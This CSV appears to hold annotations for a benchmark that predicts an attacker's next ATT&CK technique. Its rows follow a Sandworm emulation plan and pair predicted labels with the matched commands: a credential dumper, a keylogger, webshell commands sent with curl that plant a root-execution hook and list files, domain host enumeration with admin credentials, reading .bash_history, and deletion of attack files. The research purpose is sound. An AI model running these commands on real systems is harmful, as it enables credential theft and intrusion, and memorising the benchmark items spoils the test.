annotation_id,sample_id,source_org,plan_id,scenario_id,prefix_len,state,true_label,top1_pred,true_rank,current_access_context,exhausted_action_constraint,next_target_artifact,next_micro_verb,label_confidence,annotation_notes,ann_num,matched_yaml_pos_0based,matched_suffix_len,prefix_seq_len,matched_step_idx,matched_technique_attack_id,matched_parent_tid,matched_technique_name,matched_description,matched_command_summary,alignment_ok
ms_051,sandworm::unknown::20,sandworm,sandworm,unknown,20,T1105 T1505 T1033 T1082 T1083 T1003 T1105 T1548 T1053 T1543 T1003 T1552 T1021 T1569 T1547 T1033 T1082 T1083 T1049 T1105,T1555,T1572,181,execution_on_host,credential_material_not_collected,stored_credentials,collect,human_verified,human_revised_v1,51,24,6,20,25,T1555.003,T1555,Credentials from Password Stores: Credentials from Web Browsers,Sandworm executes web credential dumper oradump.exe.,C:\Windows\System32\oradump.exe 2>&1,1
ms_052,sandworm::unknown::24,sandworm,sandworm,unknown,24,T1105 T1505 T1033 T1082 T1083 T1003 T1105 T1548 T1053 T1543 T1003 T1552 T1021 T1569 T1547 T1033 T1082 T1083 T1049 T1105 T1555 T1105 T1056 T1041,T1056,T1572,171,execution_on_host,credential_material_not_collected,credential_material,collect,human_verified,human_revised_v1,52,30,2,24,31,T1056.001,T1056,Input Capture: Keylogging,Terminates the mslog.exe keystroke process.,taskkill /F /IM mslog.exe,1
ms_053,sandworm::unknown::22,sandworm,sandworm,unknown,22,T1105 T1505 T1033 T1082 T1083 T1003 T1105 T1548 T1053 T1543 T1003 T1552 T1021 T1569 T1547 T1033 T1082 T1083 T1049 T1105 T1555 T1105,T1056,T1572,171,execution_on_host,credential_material_not_collected,credential_material,collect,human_verified,human_revised_v1,53,26,8,22,27,T1056.001,T1056,Input Capture: Keylogging,Sandworm runs the keylogger in the background to log keystrokes to mslog.txt. Sandworm Team has used a keylogger to capture keystrokes by using the SetWindowsHookEx function.,"exec-background cmd.exe /k ""C:\Windows\System32\mslog.exe -o C:\Windows\System32\mslog.txt""",1
ms_054,sandworm::unknown::7,sandworm,sandworm,unknown,7,T1105 T1505 T1033 T1082 T1083 T1003 T1105,T1548,T1570,170,execution_on_host,privilege_context_insufficient,access_token_context,elevate,human_verified,human_revised_v1,54,7,7,7,8,T1548.001,T1548,Abuse Elevation Control Mechanism: Setuid and Setgid,"Sandworm executes the downloaded agent executable by running SUID binary /bin/backup. This binary executes check.sh, which causes the agent to be executed with root privileges. This ability must be run by an agent running on the attacker-controlled machine (e.g. on the C2 server itself), since it will target patient zero. Requires curl to be installed on the attacker-controlled machine.","curl --insecure ""https://#{initial.target.host}/search.php?cmd=echo%20%27%2Fvar%2Fwww%2Fhtml%2Fcentreon_module_linux_app64%20%26%27%20%3E%3E%20%2Fvar%2Fwww%2Fhtml%2Finclude%2Ftools%2Fcheck.sh"" 2>/dev/null;",1
ms_055,sandworm::unknown::26,sandworm,sandworm,unknown,26,T1105 T1505 T1033 T1082 T1083 T1003 T1105 T1548 T1053 T1543 T1003 T1552 T1021 T1569 T1547 T1033 T1082 T1083 T1049 T1105 T1555 T1105 T1056 T1041 T1056 T1018,T1070,T1572,166,execution_on_host,defense_evasion_path_not_established,process_or_file_identity,modify,human_verified,human_revised_v1,55,32,4,26,33,T1070.004,T1070,Indicator Removal on Host: File Deletion,Sandworm Team has used backdoors that can delete files used in an attack from an infected system.,del /Q C:\Windows\System32\oradump.exe C:\Windows\System32\mslog.exe C:\Windows\System32\mslog.txt,1
ms_056,sandworm::unknown::25,sandworm,sandworm,unknown,25,T1105 T1505 T1033 T1082 T1083 T1003 T1105 T1548 T1053 T1543 T1003 T1552 T1021 T1569 T1547 T1033 T1082 T1083 T1049 T1105 T1555 T1105 T1056 T1041 T1056,T1018,T1572,164,post_compromise_discovery,remote_targets_not_identified,remote_host_list,enumerate,human_verified,human_revised_v1,56,31,3,25,32,T1018,T1018,Remote System Discovery,Sandworm Enumerate all domain hosts via dsquery.exe in preparation for notpetya deployment.,dsquery.exe computer -s #{dc.target.host} -u #{domain.admin.name} -p #{domain.admin.password},1
ms_057,sandworm::unknown::18,sandworm,sandworm,unknown,18,T1105 T1505 T1033 T1082 T1083 T1003 T1105 T1548 T1053 T1543 T1003 T1552 T1021 T1569 T1547 T1033 T1082 T1083,T1049,T1570,47,post_compromise_discovery,environment_not_enumerated,network_configuration,enumerate,human_verified,human_revised_v1,57,22,4,18,23,T1049,T1049,System Network Connections Discovery,"Sandworm Team had gathered user, IP address, and server data related to RDP sessions on a compromised host.",netstat -ano | findstr 3389,1
ms_058,sandworm::unknown::4,sandworm,sandworm,unknown,4,T1105 T1505 T1033 T1082,T1083,T1033,44,post_compromise_discovery,collection_target_not_identified,local_file_data,enumerate,human_verified,human_revised_v1,58,4,4,4,5,T1083,T1083,File and Directory Discovery,"Sandworm enumerates files on a compromised host by issuing shell commands through the PHP webshell. This ability must be run by an agent running on the attacker-controlled machine (e.g. on the C2 server itself), since it will target patient zero. Requires curl to be installed on the attacker-controlled machine.","curl --insecure ""https://#{initial.target.host}/search.php?cmd=ls+-lsahR+/"" 2>/dev/null",1
ms_059,sandworm::unknown::32,sandworm,sandworm,unknown,32,T1105 T1505 T1033 T1082 T1083 T1003 T1105 T1548 T1053 T1543 T1003 T1552 T1021 T1569 T1547 T1033 T1082 T1083 T1049 T1105 T1555 T1105 T1056 T1041 T1056 T1018 T1070 T1021 T1105 T1021 T1105 T1486,T1021,T1572,35,internal_host_access,remote_execution_path_not_established,service_execution_channel,execute,human_verified,human_revised_v1,59,39,2,32,40,T1021.001,T1021,Remote Services: Remote Desktop Protocol,"End the RDP session to the domain controller. This ability must be run by an agent running on the attacker-controlled machine (e.g. on the C2 server itself), since the RDP connection originates from the attacker's machine.",pkill xfreerdp,1
ms_060,sandworm::unknown::11,sandworm,sandworm,unknown,11,T1105 T1505 T1033 T1082 T1083 T1003 T1105 T1548 T1053 T1543 T1003,T1552,T1003,3,execution_on_host,credential_material_not_collected,stored_credentials,collect,human_verified,human_revised_v1,60,13,4,11,14,T1552.003,T1552,Unsecured Credentials: Bash History,Sandworm reads bash history. Note: not in CTI but in TTP scope.,cat /home/#{initial.user.name}/.bash_history,1
